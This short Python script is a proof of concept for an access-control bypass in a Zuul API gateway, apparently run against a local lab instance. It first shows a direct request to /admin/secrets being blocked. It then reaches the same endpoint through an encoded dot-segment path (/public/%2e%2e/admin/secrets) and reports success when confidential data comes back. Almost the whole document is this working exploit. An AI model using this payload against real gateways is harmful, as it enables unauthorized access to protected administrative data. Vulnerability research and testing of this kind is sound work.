import requests

def test_acl_bypass():
    GATEWAY_URL = "http://localhost:7001"

    print("=== Zuul ACL Bypass via Path Normalization PoC ===")

    # 1. Normal access to public endpoint
    print("\n[1] Accessing public endpoint...")
    resp = requests.get(f"{GATEWAY_URL}/public")
    print(f"Status: {resp.status_code}, Body: {resp.text[:50]}...")

    # 2. Blocked access to admin endpoint
    print("\n[2] Attempting direct access to admin endpoint (should be blocked by BypassFilter)...")
    resp = requests.get(f"{GATEWAY_URL}/admin/secrets")
    print(f"Status: {resp.status_code}, Body: {resp.text}")

    # 3. Bypassed access via normalization discrepancy
    # BypassFilter blocks raw path starting with /admin
    # Zuul allows /public/../admin because it doesn't start with /admin (raw path is used for startsWith)
    # Backend decodes and normalizes to /admin/secrets
    print("\n[3] Attempting bypassed access via path normalization discrepancy...")
    # %2e%2e is ..
    bypass_url = f"{GATEWAY_URL}/public/%2e%2e/admin/secrets"
    print(f"URL: {bypass_url}")
    resp = requests.get(bypass_url)
    print(f"Status: {resp.status_code}, Body: {resp.text}")

    if "CONFIDENTIAL DATA" in resp.text:
        print("\n[!] VULNERABILITY CONFIRMED: ACL Bypass Successful!")
        print("Successfully accessed confidential data through the gateway by exploiting path normalization discrepancies.")
    else:
        print("\n[-] Bypass failed.")

if __name__ == "__main__":
    test_acl_bypass()
